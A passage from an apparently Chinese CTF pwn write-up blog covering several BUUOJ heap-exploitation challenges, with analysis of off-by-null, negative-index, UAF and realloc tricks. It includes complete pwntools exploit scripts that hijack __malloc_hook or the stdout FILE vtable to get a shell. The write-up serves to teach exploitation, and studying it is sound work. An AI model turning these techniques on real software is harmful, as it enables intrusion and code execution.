<h4 id="劫持malloc-hook"><a href="#劫持malloc-hook" class="headerlink" title="劫持malloc_hook"></a>劫持malloc_hook</h4><p>有了libc基地址，还可以打fastbin attack的话，那就是一个常规的劫持malloc_hook了，就利用malloc_hook-0x23那个位置存在的0x7f来伪造成size将malloc_hook申请出来，然后这道题的话one_gadget也都不通，需要用realloc函数来调整一下栈帧。</p>
<p>这部分exp如下：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x60</span>,<span class="number">10</span>,<span class="string">&#x27;a&#x27;</span>,<span class="number">0</span>) </span><br><span class="line">delete(<span class="number">10</span>,<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">10</span>,p64(malloc_hook-<span class="number">0x23</span>),<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">12</span>,<span class="string">&#x27;a&#x27;</span>,<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">13</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0xb</span>+p64(one_gadget)+p64(realloc+<span class="number">6</span>),<span class="number">0</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice &gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;wlecome input your size of weapon: &#x27;</span>,<span class="built_in">str</span>(<span class="number">0x60</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;input index: &#x27;</span>,<span class="built_in">str</span>(<span class="number">14</span>))</span><br></pre></td></tr></table></figure>



<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h3><p>由于这道题需要爆破一比特位，因此我们最终还有再加一个爆破部分。最终的exp如下：<br><a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">tools源码</a></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,28187)</span></span><br><span class="line">d_a=<span class="number">0xEAE</span></span><br><span class="line">d_d=<span class="number">0xec0</span></span><br><span class="line">d_e=<span class="number">0xed2</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,index,content,choice=<span class="number">1</span></span>):</span><br><span class="line">    <span class="keyword">if</span> choice:</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;choice &gt;&gt; \n&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;choice &gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;wlecome input your size of weapon: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;input index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    <span class="keyword">if</span> choice:</span><br><span class="line">        p.sendafter(<span class="string">&#x27;input your name:\n&#x27;</span>,content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendafter(<span class="string">&#x27;input your name:&#x27;</span>,content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content,choice=<span class="number">1</span></span>):</span><br><span class="line">    <span class="keyword">if</span> choice:</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;choice &gt;&gt; \n&#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;choice &gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;input idx: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    <span class="keyword">if</span> choice:</span><br><span class="line">        p.sendafter(<span class="string">&#x27;new content:\n&#x27;</span>,content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendafter(<span class="string">&#x27;new content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index,choice=<span class="number">1</span></span>):</span><br><span class="line">    <span class="keyword">if</span> choice:</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;choice &gt;&gt; \n&#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;choice &gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;input idx :&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">1</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">8</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x20</span>,<span class="number">7</span>,<span class="string">&#x27;prevent_chunk&#x27;</span>)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    edit(<span class="number">0</span>,<span class="string">&#x27;\x50&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">5</span>,p64(<span class="number">0</span>)*<span class="number">9</span>+p64(<span class="number">0x71</span>))</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">6</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0xe1</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    delete(<span class="number">1</span>)<span class="comment">#将大堆块释放，使其进入unsorted bin中</span></span><br><span class="line">    </span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    delete(<span class="number">8</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    edit(<span class="number">8</span>,<span class="string">&#x27;\x70&#x27;</span>)<span class="comment">#将unsorted bin中的堆块篡改到fast bin上</span></span><br><span class="line">    </span><br><span class="line">    edit(<span class="number">6</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x71</span>)+<span class="string">b&#x27;\xdd\x25&#x27;</span>)<span class="comment">#伪造0x71的size，使其通过fast bin的检查,伪造fake chunk到stdout结构体上方(需要爆破一位)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">9</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#将fastbin中的堆块申请出去，打fastbin attack</span></span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">10</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">11</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x33</span>+p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    leak_libc=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    libc_base=leak_libc-<span class="number">0x3c5600</span></span><br><span class="line">    malloc_hook=libc_base+libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    log_addr(<span class="string">&#x27;leak_libc&#x27;</span>)</span><br><span class="line">    log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">    one_gadget=libc_base+search_og(<span class="number">1</span>)</span><br><span class="line">    realloc=libc_base+libc.symbols[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">    log_addr(<span class="string">&#x27;one_gadget&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">10</span>,<span class="string">&#x27;a&#x27;</span>,<span class="number">0</span>) </span><br><span class="line">    delete(<span class="number">10</span>,<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">    edit(<span class="number">10</span>,p64(malloc_hook-<span class="number">0x23</span>),<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">12</span>,<span class="string">&#x27;a&#x27;</span>,<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">13</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0xb</span>+p64(one_gadget)+p64(realloc+<span class="number">6</span>),<span class="number">0</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice &gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    </span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;wlecome input your size of weapon: &#x27;</span>,<span class="built_in">str</span>(<span class="number">0x60</span>))</span><br><span class="line">    <span class="comment">#debug(p,&#x27;pie&#x27;,d_a,d_d,d_e)</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;input index: &#x27;</span>,<span class="built_in">str</span>(<span class="number">14</span>))</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29923</span>)</span><br><span class="line">        pwn()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/../img/2706180-20220826111332346-148506803.png"></p>
<h2 id="nsctf-online-2019-pwn1"><a href="#nsctf-online-2019-pwn1" class="headerlink" title="nsctf_online_2019_pwn1"></a>nsctf_online_2019_pwn1</h2><p>通过这道题的学习与总结有：</p>
<p>1、篡改_IO_FILE结构体中的vtable字段时，要不可避免的填充之前的字段，但如果将_lock字段破坏的话，在执行输出函数中最开始上锁的宏<code>_IO_acquire_lock (_IO_stdout)</code>就会崩溃掉，因此需要保证_lock字段是正常的。</p>
<p>2、如果想通过直接修改_IO_2_1_stdout_结构体中的字段来获取shell的话，我们可以将_flags字段写入字符串&#x2F;bin&#x2F;sh\x00(是字符串，并非该字符串的地址)，然后将vtable修改为_IO_2_1_stdout_的地址+0x10，然后将_IO_save_base字段写成system地址，最后要将_lock字段写入原本正常的值。这样当执行puts函数的时候会调用vtable中的_IO_new_file_xsputn函数，但是vtable已经被修改，这个函数的偏移是0x38,而vtable被修改成_IO_2_1_stdout_的地址+0x10,最终调用的是_IO_2_1_stdout_的地址+0x48的函数指针，而这个位置就是_IO_save_base字段，里面放的是system的地址。而_IO_new_file_xsputn函数的第一个参数是_IO_2_1_stdout_的地址，而这个地址原本应该是_flags字段，但是现在却被写入了&#x2F;bin&#x2F;sh字符串。因此本来正常调用的_IO_new_file_xsputn函数如今变成了system(‘&#x2F;bin&#x2F;sh\x00’),从而获取shell。(该方法只能在libc2.23以上的版本就无法再使用了)</p>
<p>3、<strong>只有off by null漏洞的话，想需要将unsorted bin中的fd放到fastbin的fd上，需要打两次off by null+堆块重叠，并且最后将其申请出来之前，需要篡改一下size的大小。</strong></p>
<h3 id="保护策略：-1"><a href="#保护策略：-1" class="headerlink" title="保护策略："></a>保护策略：</h3><p><img src="/../img/2706180-20220826111350808-1322092443.png"></p>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析:"></a>漏洞分析:</h3><p>首先在edit函数中，输入索引的部分，检查不完全，导致了这个索引是可以为负溢出的。</p>
<p><img src="/../img/2706180-20220826111401744-135014955.png"></p>
<p>然后在edit函数写入数据的地方，如果add创建时的大小等于edit时输入的大小，那么就有一个off by null漏洞。</p>
<p><img src="/../img/2706180-20220826111445836-811184644.png"></p>
<h3 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h3><h4 id="思路一：利用索引为负，溢出漏洞"><a href="#思路一：利用索引为负，溢出漏洞" class="headerlink" title="思路一：利用索引为负，溢出漏洞"></a>思路一：利用索引为负，溢出漏洞</h4><p><img src="/../img/2706180-20220826111507589-1206383168.png"></p>
<p>我们发现数组的索引为负数，是可以找到bss段存放的stdout指针，而这个指针存放的是_IO_2_1_stdout_结构体指针，如果read往里面写数据的话，就可以直接篡改_IO_2_1_stdout_结构体的各个字段。</p>
<p>通过这个方式，我们可以打一个io leak，泄露libc地址，然后再篡改_flags、_lock、vtable、_IO_save_base字段，最终劫持vtable中的_IO_new_file_xsputn函数为system函数，执行获取shell。</p>
<p>这次跟着<a href="https://www.cnblogs.com/LynneHuan/p/15229822.html">roderick师傅的博客</a>学到了这个FileStructure()的用法，感觉蛮方便的。<br><a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">tools源码</a></p>
<h4 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP:"></a>EXP:</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&#x27;pwn&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27580</span>)</span><br><span class="line">d_a=<span class="number">0xF1B</span></span><br><span class="line">d_d=<span class="number">0xF27</span></span><br><span class="line">d_e=<span class="number">0xF3f</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;5.exit\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input the size:\n&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input the content:\n&#x27;</span>,content)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Add success\n&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;5.exit\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input the index:\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input size:\n&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Input new content:\n&#x27;</span>,content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;5.exit\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input the index:\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Delete success\n&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">payload=p64(<span class="number">0xfbad1887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00&#x27;</span>//改成<span class="number">0xfbad1887</span>的话,puts函数打印出来的数据后面依然有\n</span><br><span class="line"><span class="comment">#debug(p,&#x27;pie&#x27;,d_d,d_a,d_e,0xe34)</span></span><br><span class="line">edit(-<span class="number">0x10</span>,<span class="number">0xf0</span>,payload)</span><br><span class="line">leak_libc=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&#x27;leak_libc&#x27;</span>)</span><br><span class="line">libc_base=leak_libc-<span class="number">0x3c36e0</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">file=FileStructure()</span><br><span class="line">file.flags=<span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">file.vtable=libc_base+libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]+<span class="number">0x10</span></span><br><span class="line">file._IO_save_base=libc.symbols[<span class="string">&#x27;system&#x27;</span>]+libc_base</span><br><span class="line">file._lock=libc_base+<span class="number">0x3c6780</span><span class="comment">#确保这个_lock字段的值是正常的</span></span><br><span class="line">edit(-<span class="number">0x10</span>,<span class="number">0xf0</span>,<span class="built_in">bytes</span>(file))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="/../img/2706180-20220826112921840-1751167110.png"></p>
<h4 id="思路二：利用off-by-null"><a href="#思路二：利用off-by-null" class="headerlink" title="思路二：利用off_by_null"></a>思路二：利用off_by_null</h4><p>这个思路比较常规，也比较麻烦。</p>
<p>主要是通过两次off by null造成两次堆块重叠，然后将unsorted bin中的fd指针写入fastbin中的fd位置。然后打fastbin attack进行io leak。最后再打fastbin attack往malloc_hook中写入one_gadget。</p>
<p>整体来说最麻烦的部分就是将unsorted bin中的fd指针写入fastbin中的fd位置。</p>
<p>这里的具体过程如下：</p>
<blockquote>
<p><strong>利用off by one(null)先打一个堆块重叠，然后在bss段上留下两个spy chunk的地址</strong>，将其中一个释放掉进入fast bin中，那么此时bss段上还有一个spy chunk的地址。但此时的unsorted bin的地址已经低于了spy chunk的地址，那就将unsorted bin中的堆块都申请回来。然后再次利用off by one(null)做一个堆块重叠，这次<strong>将merged chunk申请回来后，unsorted bin的fd指针就自然落到了spy chunk的fd指针上(别忘了此时这个堆块也位于fastbin中)，这样unsorted bin中的fd指针就落到了fast bin中</strong>，同时bss段上仍然存在一个spy chunk的地址，这样编辑该堆块就可以控制unsorted bin中的fd指针，此时的size是unsorted bin范围里的大size(无法直接将其申请出来)，此时我们应该去将merged chunk释放掉，然后unsorted bin向上合并(向低地址合并)，而原本spy chunk的fd并不会消失，然后再次申请一个len(merged chunk)+0x10+2 大小的chunk，这样往这个新chunk写入数据的时候，就可以控制spy chunk的size，顺便还能把spy chunk的fd(也就是main_arena+88)的后两字节给修改到stdout结构体上方。</p>
</blockquote>
<h4 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP:"></a>EXP:</h4><p><a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">tools源码</a></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">d_a=<span class="number">0xF1B</span></span><br><span class="line">d_d=<span class="number">0xF27</span></span><br><span class="line">d_e=<span class="number">0xF3f</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content,choice=<span class="number">1</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;5.exit\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input the size:\n&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    <span class="keyword">if</span> choice:</span><br><span class="line">        p.sendafter(<span class="string">&#x27;Input the content:\n&#x27;</span>,content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendafter(<span class="string">&#x27;Input the content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,content,choice=<span class="number">1</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;5.exit\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input the index:\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input size:\n&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    <span class="keyword">if</span> choice:</span><br><span class="line">        p.sendafter(<span class="string">&#x27;Input new content:\n&#x27;</span>,content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendafter(<span class="string">&#x27;Input new content:&#x27;</span>,content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;5.exit\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input the index:\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Delete success\n&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">    add(<span class="number">0x68</span>,<span class="string">&#x27;b&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">    add(<span class="number">0xf0</span>,<span class="string">&#x27;c&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">&#x27;d&#x27;</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    edit(<span class="number">1</span>,<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x60</span>+p64(<span class="number">0x100</span>))</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">2</span>)<span class="comment">#merge succeeded</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">    add(<span class="number">0x68</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#5</span></span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">0xf0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#add(0x100,&#x27;a&#x27;)</span></span><br><span class="line"> </span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    edit(<span class="number">2</span>,<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x60</span>+p64(<span class="number">0x70</span>+<span class="number">0x90</span>))</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    <span class="comment">#debug(p,&#x27;pie&#x27;,d_d,d_a,d_e,0xB64)   </span></span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    add((<span class="number">0x80</span>+<span class="number">0x10</span>+<span class="number">2</span>),p64(<span class="number">0</span>)*<span class="number">17</span>+p64(<span class="number">0x71</span>)+<span class="string">b&#x27;\xdd\x25&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x68</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x59</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x33</span>+p64(<span class="number">0xfbad1887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x60&#x27;</span>,<span class="number">0</span>)</span><br><span class="line">    leak_libc=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    log_addr(<span class="string">&#x27;leak_libc&#x27;</span>)</span><br><span class="line">    libc_base=leak_libc-<span class="number">0x3c56a4</span></span><br><span class="line">    log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">    malloc_hook=libc_base+libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    one_gadget=search_og(<span class="number">3</span>)+libc_base</span><br><span class="line">    log_addr(<span class="string">&#x27;one_gadget&#x27;</span>)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    edit(<span class="number">2</span>,<span class="number">0x68</span>,p64(malloc_hook-<span class="number">0x23</span>))</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x13</span>+p64(one_gadget))</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;5.exit\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input the size:\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">0x60</span>))</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29269</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pwn()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br></pre></td></tr></table></figure>

<p><img src="/../img/2706180-20220826111533151-552713986.png"></p>
<h2 id="TWCTF-online-2019-asterisk-alloc"><a href="#TWCTF-online-2019-asterisk-alloc" class="headerlink" title="TWCTF_online_2019_asterisk_alloc"></a>TWCTF_online_2019_asterisk_alloc</h2><h3 id="收获与总结："><a href="#收获与总结：" class="headerlink" title="收获与总结："></a>收获与总结：</h3><p>这道题主要就是realloc函数的妙用，学到了关于这个函数很多新知识。这个函数会根据参数的不同来实现不同的功能，具体情况如下：</p>
<blockquote>
<p>realloc(ptr,size)函数</p>
<p>当size不合法，比如-1时，realloc函数就会返回NULL。</p>
<p>当size为0且ptr存在时，就会执行free(ptr)且返回NULL</p>
<p>当size正常且ptr不存在时，就会执行malloc(ptr)</p>
<p>当size正常且ptr存在时，这就涉及到了两种情况，第一种是size大于了ptr指向堆块的size，这种情况先判断ptr指向的堆块能否与top chunk或者位于高地址且free状态的堆块合并，如果合并后二者大小满足size则进行合并。如果不能合并的话再去申请一块新的内存，将原来的数据拷贝过来，再释放之前的堆块。第二种是size小于了ptr指向堆块的size，这种情况会留下size大小的堆块，将剩余部分的堆块给释放掉。</p>
</blockquote>
<h3 id="保护策略：-2"><a href="#保护策略：-2" class="headerlink" title="保护策略："></a>保护策略：</h3><p><img src="/../img/2706180-20220826113015547-280603116.png"></p>
<h3 id="漏洞分析：-1"><a href="#漏洞分析：-1" class="headerlink" title="漏洞分析："></a>漏洞分析：</h3><p><img src="/../img/2706180-20220826113031894-2049890680.png"></p>
<p>free的时候没有将指针置空，存在UAF漏洞。当UAF配上2.27-3ubuntu1这个版本，实在是舒服至极，因为我们可以直接使用tcache dup。同时这道题保护为FULL RELRO还没有打印函数，那就可以基本确定打IO leak了。</p>
<h3 id="程序简单分析："><a href="#程序简单分析：" class="headerlink" title="程序简单分析："></a>程序简单分析：</h3><p>这道题有一点点特殊，没有edit函数没有show函数。但是add函数里存在三个申请内存的函数，分别是malloc calloc realloc函数。通过观察add和delete函数的代码，发现malloc和calloc函数只能用一次，因此这道题只能将目光放到realloc函数上。realloc函数对于参数的不同，自身也有很多不同的功能（文章开始已经说明了）</p>
<p>这道题的核心点并不是在于怎么将unsorted bin中的fd指针给弄到tcachebin上，这一点有好几种方法都可以，难点是不太好编辑这个unsorted bin中的fd指针。这里采用的方法是申请一个大堆块A，然后再用realloc函数申请一个小堆块B(要保证A_size-B_size&gt;0x80,让其满足释放后可以进入unsorted bin的大小)，由于堆块B的size小于A，这样就保留堆块B大小的size，将堆块A的剩余部分(堆块C)释放掉。然后释放八次堆块C，这样C就进入了unsorted bin中，然后我们执行realloc(ptr_B,sizeof(堆块A))，此时的效果就是将堆块C申请回来与堆块B合并成为了堆块A，而我们的数据就可以去正常编辑原本堆块C的unsorted bin的fd指针了。</p>
<p>剩下就是常规操作打一个tcache dup+poisoning将free_hook申请出来最后释放掉存有&#x2F;bin&#x2F;sh字符串的堆块了。</p>
<p>整个过程就在于一个realloc函数的妙用，因为我们要不断的改变并控制ptr_r那个值，所以经常穿插将其size设置为0或者-1。</p>
<h3 id="调试过程："><a href="#调试过程：" class="headerlink" title="调试过程："></a>调试过程：</h3><p>下图为free掉一个堆块八次，然后unsorted bin中的fd指针就出现到了tcachebin中</p>
<p><img src="/../img/2706180-20220826113058600-240750503.png"></p>
<p>这部分的exp如下：</p>
